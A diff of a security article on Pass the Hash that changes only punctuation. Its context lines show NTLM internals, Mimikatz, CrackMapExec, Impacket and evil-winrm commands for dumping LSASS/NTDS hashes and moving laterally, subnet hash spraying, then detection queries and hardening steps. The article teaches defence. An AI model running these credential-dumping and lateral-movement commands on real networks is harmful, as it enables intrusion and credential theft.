@@ -18,11 +18,11 @@ featured: false
 
 ## Definition
 
-Pass the Hash (PtH) is a lateral movement technique that exploits the NTLM authentication protocol by substituting a stolen password hash for the plaintext password. Because NTLM derives all session credentials directly from the NT hash — never requiring the plaintext — possessing the hash is functionally identical to possessing the password.
+Pass the Hash (PtH) is a lateral movement technique that exploits the NTLM authentication protocol by substituting a stolen password hash for the plaintext password. Because NTLM derives all session credentials directly from the NT hash, never requiring the plaintext, possessing the hash is functionally identical to possessing the password.
 
 ---
 
-## NTLM Authentication Internals — Why This Works
+## NTLM Authentication Internals, Why This Works
 
 NTLM uses a challenge-response scheme. The server never sees the plaintext password at any point:
 
@@ -32,7 +32,7 @@ NTLM uses a challenge-response scheme. The server never sees the plaintext passw
 4. Client sends the response to the server
 5. Server validates (locally or by forwarding to the DC)
 
-The NT hash is the only secret involved. An attacker who possesses it can compute the correct challenge-response for any future challenge — **no cracking, no plaintext needed**.
+The NT hash is the only secret involved. An attacker who possesses it can compute the correct challenge-response for any future challenge, **no cracking, no plaintext needed**.
 
 The NT hash is computed as: `MD4(UTF-16LE(password))`
 
@@ -44,7 +44,7 @@ The NT hash is computed as: `MD4(UTF-16LE(password))`
 
 LSASS is the primary target. Windows caches credentials in LSASS memory to support Single Sign-On without constant re-authentication:
 
-- **WDigest** (legacy — disabled by default since Windows 8.1/2012 R2): stores plaintext credentials in memory
+- **WDigest** (legacy, disabled by default since Windows 8.1/2012 R2): stores plaintext credentials in memory
 - **NTLM hashes**: always cached for authenticated sessions
 - **Kerberos tickets and session keys**: cached in the LSASS credential store
 - **DPAPI master keys**: used to decrypt browser-saved passwords
@@ -68,14 +68,14 @@ The Active Directory database (`C:\Windows\NTDS\ntds.dit`) on domain controllers
 
 ## How an Attacker Performs This Attack
 
-### Phase 1 — Gain initial access and escalate to local admin
+### Phase 1, Gain initial access and escalate to local admin
 
 PtH requires local Administrator rights on the source machine to dump LSASS.
 
-### Phase 2 — Dump Credentials
+### Phase 2, Dump Credentials
 
 ```cmd
-# Mimikatz — dump all credentials from LSASS
+# Mimikatz, dump all credentials from LSASS
 privilege::debug
 sekurlsa::logonpasswords
 ```
@@ -91,13 +91,13 @@ NTLM              : 8846f7eaee8fb117ad06bdd830b7586c
 ```
 
 ```cmd
-# Mimikatz — dump only NTLM hashes (quieter)
+# Mimikatz, dump only NTLM hashes (quieter)
 sekurlsa::msv
 
 # Dump SAM (local accounts)
 lsadump::sam
 
-# DCSync — dump domain hashes without touching NTDS.dit on disk
+# DCSync, dump domain hashes without touching NTDS.dit on disk
 lsadump::dcsync /user:administrator
 lsadump::dcsync /domain:domain.local /all /csv
 ```
@@ -112,33 +112,33 @@ lsadump::dcsync /domain:domain.local /all /csv
 ```
 
 ```bash
-# CrackMapExec — remote credential dump
+# CrackMapExec, remote credential dump
 crackmapexec smb 192.168.1.50 -u Administrator -p Password123 --sam
 crackmapexec smb 192.168.1.50 -u Administrator -p Password123 --lsa
 crackmapexec smb 192.168.1.50 -u Administrator -p Password123 --ntds
 ```
 
-### Phase 3 — Lateral Movement with the Hash
+### Phase 3, Lateral Movement with the Hash
 
 ```cmd
-# Mimikatz — spawn a new process with the hash injected
+# Mimikatz, spawn a new process with the hash injected
 sekurlsa::pth /user:Administrator /domain:domain.local \
   /ntlm:8846f7eaee8fb117ad06bdd830b7586c /run:cmd.exe
 ```
 
 ```bash
-# Impacket suite — various protocols
+# Impacket suite, various protocols
 python3 psexec.py   -hashes :8846f7eaee8fb117ad06bdd830b7586c administrator@192.168.1.50
 python3 wmiexec.py  -hashes :8846f7eaee8fb117ad06bdd830b7586c administrator@192.168.1.50
 python3 smbexec.py  -hashes :8846f7eaee8fb117ad06bdd830b7586c administrator@192.168.1.50
 python3 atexec.py   -hashes :8846f7eaee8fb117ad06bdd830b7586c administrator@192.168.1.50 "whoami"
 
-# Evil-WinRM — WinRM-based shell
+# Evil-WinRM, WinRM-based shell
 evil-winrm -i 192.168.1.50 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c
 ```
 
 ```powershell
-# CrackMapExec — spray hash across an entire subnet
+# CrackMapExec, spray hash across an entire subnet
 crackmapexec smb 192.168.1.0/24 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c --local-auth
 crackmapexec smb 192.168.1.0/24 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c
 # --local-auth = try local account; without it = domain account
@@ -171,7 +171,7 @@ crackmapexec smb 192.168.1.0/24 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7
 
 ```powershell
 # NTLM network logons (LogonType=3, AuthPackage=NTLM)
-# Flag workstation-to-workstation NTLM — this is the PtH pattern
+# Flag workstation-to-workstation NTLM, this is the PtH pattern
 Get-WinEvent -FilterHashtable @{ LogName = 'Security'; Id = 4624 } |
   Where-Object {
     $_.Properties[8].Value  -eq 3      -and  # LogonType = Network
@@ -270,7 +270,7 @@ Get-WinEvent -FilterHashtable @{ LogName = 'Security'; Id = 4624 } |
 
 ## How to Hunt It (Post-Incident)
 
-### Phase 1 — Map lateral NTLM patterns
+### Phase 1, Map lateral NTLM patterns
 
 ```powershell
 # Build a matrix: who authenticated via NTLM to where, over the last 7 days
@@ -295,7 +295,7 @@ Get-WinEvent -FilterHashtable @{
   } | Sort-Object Count -Descending
 ```
 
-### Phase 2 — Check for ProcDump / minidump artifacts
+### Phase 2, Check for ProcDump / minidump artifacts
 
 ```powershell
 # Search for LSASS dump files
@@ -305,12 +305,12 @@ Get-ChildItem -Path C:\ -Recurse -Include "*.dmp", "lsass*" `
   } | Select-Object FullName, Length, LastWriteTime
 ```
 
-### Phase 3 — Identify machines with identical local admin hashes (LAPS not deployed)
+### Phase 3, Identify machines with identical local admin hashes (LAPS not deployed)
 
 If LAPS is not deployed, check for machines where the local admin hash appears on multiple systems (indicating a shared password that could be reused for PtH across the fleet).
 
 ```bash
-# CrackMapExec — identify reused hashes across subnets
+# CrackMapExec, identify reused hashes across subnets
 # If the same hash succeeds on multiple machines, LAPS is not deployed
 crackmapexec smb 192.168.1.0/24 -u Administrator -H <captured_hash> --local-auth
 ```
@@ -344,7 +344,7 @@ Get-LapsADPassword -Identity "WORKSTATION01" -AsPlainText
 ```
 
 ```powershell
-# Legacy LAPS (Microsoft LAPS) — still widely deployed
+# Legacy LAPS (Microsoft LAPS), still widely deployed
 # Check LAPS deployment
 Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime |
   Where-Object { -not $_.'ms-Mcs-AdmPwd' } |
@@ -353,7 +353,7 @@ Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime 
 
 ### 2. Enable Credential Guard
 
-Credential Guard uses Virtualization-Based Security (VBS) to run LSASS in a protected environment (VSM — Virtual Secure Mode). Credential material in the protected LSASS cannot be read by processes running in the normal OS.
+Credential Guard uses Virtualization-Based Security (VBS) to run LSASS in a protected environment (VSM, Virtual Secure Mode). Credential material in the protected LSASS cannot be read by processes running in the normal OS.
 
 ```powershell
 # Enable via registry (requires UEFI, Secure Boot, and VT-x/AMD-V)
@@ -381,7 +381,7 @@ Get-CimInstance -ClassName Win32_DeviceGuard `
 
 ### 3. Enable LSA Protection (Protected Process Light)
 
-PPL marks LSASS as a protected process — kernel-mode code and user-mode code cannot inject into it without a valid Microsoft-signed driver.
+PPL marks LSASS as a protected process, kernel-mode code and user-mode code cannot inject into it without a valid Microsoft-signed driver.
 
 ```powershell
 # Enable LSA PPL
@@ -419,7 +419,7 @@ Get-ADGroupMember 'Protected Users' | Select-Object SamAccountName
 > [!WARNING]
 > Protected Users membership permanently disables NTLM for those accounts everywhere. Applications using NTLM for these accounts will break immediately. Do not add service accounts that use NTLM until you have confirmed Kerberos works for every system they authenticate to.
 
-### 5. Restrict NTLM — Phase It Out
+### 5. Restrict NTLM, Phase It Out
 
 ```powershell
 # Phase 1: Audit mode (log all NTLM, do not block)
@@ -440,4 +440,4 @@ Get-ADGroupMember 'Protected Users' | Select-Object SamAccountName
 
 ## Conclusion
 
-Pass the Hash exploits a 30-year-old protocol design where the hash is the password. LAPS eliminates the most impactful attack path (reused local admin hashes across the fleet) and should be your first deployment. Credential Guard seals LSASS on modern hardware. Protected Users eliminates NTLM for privileged accounts at the protocol level. The detection story depends heavily on baselining NTLM traffic — you cannot alert on anomalies you have never measured.
+Pass the Hash exploits a 30-year-old protocol design where the hash is the password. LAPS eliminates the most impactful attack path (reused local admin hashes across the fleet) and should be your first deployment. Credential Guard seals LSASS on modern hardware. Protected Users eliminates NTLM for privileged accounts at the protocol level. The detection story depends heavily on baselining NTLM traffic, you cannot alert on anomalies you have never measured.
